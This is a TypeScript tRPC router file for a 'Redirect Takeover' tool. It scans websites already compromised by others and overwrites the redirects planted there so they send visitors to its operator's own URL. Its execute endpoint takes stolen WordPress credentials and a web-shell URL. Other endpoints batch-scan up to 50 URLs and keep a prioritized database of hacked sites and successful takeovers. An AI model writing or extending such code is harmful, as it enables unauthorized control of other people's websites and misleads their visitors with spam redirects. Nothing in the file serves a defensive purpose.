/**
 * tRPC Router: Redirect Takeover
 * Detect and overwrite competitor redirects on compromised sites
 */
import { z } from "zod";
import { protectedProcedure, router } from "../_core/trpc";
import { detectExistingRedirects, executeRedirectTakeover } from "../redirect-takeover";
import { getDb } from "../db";
import { hackedSiteDetections } from "../../drizzle/schema";
import { desc, eq } from "drizzle-orm";

export const redirectTakeoverRouter = router({
  /** Analyze a target URL to detect existing redirects */
  detect: protectedProcedure
    .input(z.object({
      targetUrl: z.string().url(),
    }))
    .mutation(async ({ input, ctx }) => {
      const result = await detectExistingRedirects(input.targetUrl);

      // Auto-save to database
      try {
        const db = await getDb();
        if (db) {
          const domain = new URL(input.targetUrl).hostname;
          await db.insert(hackedSiteDetections).values({
            domain,
            url: input.targetUrl,
            isHacked: result.detected,
            competitorUrl: result.competitorUrl,
            detectionMethods: result.methods as any,
            targetPlatform: result.targetPlatform,
            wpVersion: result.wpVersion,
            plugins: result.plugins,
            priority: result.detected ? (result.methods.some(m => m.confidence === "high") ? 10 : 5) : 0,
            source: "manual_scan",
            userId: ctx.user?.openId,
          });
        }
      } catch (e) {
        // Best-effort save — don't fail the scan
        console.error("[RedirectTakeover] Failed to save detection:", e);
      }

      return result;
    }),

  /** Execute redirect takeover on a target */
  execute: protectedProcedure
    .input(z.object({
      targetUrl: z.string().url(),
      ourRedirectUrl: z.string().url(),
      seoKeywords: z.array(z.string()).optional(),
      wpUsername: z.string().optional(),
      wpPassword: z.string().optional(),
      shellUrl: z.string().optional(),
    }))
    .mutation(async ({ input }) => {
      const results = await executeRedirectTakeover({
        targetUrl: input.targetUrl,
        ourRedirectUrl: input.ourRedirectUrl,
        seoKeywords: input.seoKeywords,
        wpCredentials: input.wpUsername && input.wpPassword
          ? { username: input.wpUsername, password: input.wpPassword }
          : undefined,
        shellUrl: input.shellUrl,
      });

      // Update database record
      try {
        const db = await getDb();
        if (db) {
          const domain = new URL(input.targetUrl).hostname;
          const anySuccess = results.some(r => r.success);
          const successMethod = results.find(r => r.success);
          await db.update(hackedSiteDetections)
            .set({
              takeoverStatus: anySuccess ? "success" : "failed",
              takeoverMethod: successMethod?.method || results.map(r => r.method).join(", "),
              takeoverResult: JSON.stringify(results),
              takeoverAt: new Date(),
            })
            .where(eq(hackedSiteDetections.domain, domain));
        }
      } catch (e) {
        console.error("[RedirectTakeover] Failed to update takeover status:", e);
      }

      return {
        results,
        anySuccess: results.some(r => r.success),
      };
    }),

  /** List all hacked site detections from database */
  listHackedSites: protectedProcedure
    .query(async () => {
      const db = await getDb();
      if (!db) return [];
      return db.select()
        .from(hackedSiteDetections)
        .orderBy(desc(hackedSiteDetections.priority), desc(hackedSiteDetections.scannedAt))
        .limit(200);
    }),

  /** Get stats for hacked sites */
  getStats: protectedProcedure
    .query(async () => {
      const db = await getDb();
      if (!db) return { total: 0, hacked: 0, takenOver: 0, failed: 0 };
      const all = await db.select().from(hackedSiteDetections);
      return {
        total: all.length,
        hacked: all.filter(s => s.isHacked).length,
        takenOver: all.filter(s => s.takeoverStatus === "success").length,
        failed: all.filter(s => s.takeoverStatus === "failed").length,
      };
    }),

  /** Batch detect — scan multiple URLs for hacked sites */
  batchDetect: protectedProcedure
    .input(z.object({
      urls: z.array(z.string().url()).max(50),
    }))
    .mutation(async ({ input, ctx }) => {
      const results: Array<{ url: string; detected: boolean; competitorUrl: string | null; error?: string }> = [];

      for (const url of input.urls) {
        try {
          const result = await detectExistingRedirects(url);
          results.push({
            url,
            detected: result.detected,
            competitorUrl: result.competitorUrl,
          });

          // Save to DB
          try {
            const db = await getDb();
            if (db) {
              const domain = new URL(url).hostname;
              await db.insert(hackedSiteDetections).values({
                domain,
                url,
                isHacked: result.detected,
                competitorUrl: result.competitorUrl,
                detectionMethods: result.methods as any,
                targetPlatform: result.targetPlatform,
                wpVersion: result.wpVersion,
                plugins: result.plugins,
                priority: result.detected ? (result.methods.some(m => m.confidence === "high") ? 10 : 5) : 0,
                source: "batch_scan",
                userId: ctx.user?.openId,
              });
            }
          } catch { /* best-effort */ }

          // Small delay between scans
          await new Promise(r => setTimeout(r, 500));
        } catch (e: any) {
          results.push({ url, detected: false, competitorUrl: null, error: e.message });
        }
      }

      return {
        results,
        totalScanned: results.length,
        hackedFound: results.filter(r => r.detected).length,
      };
    }),
});
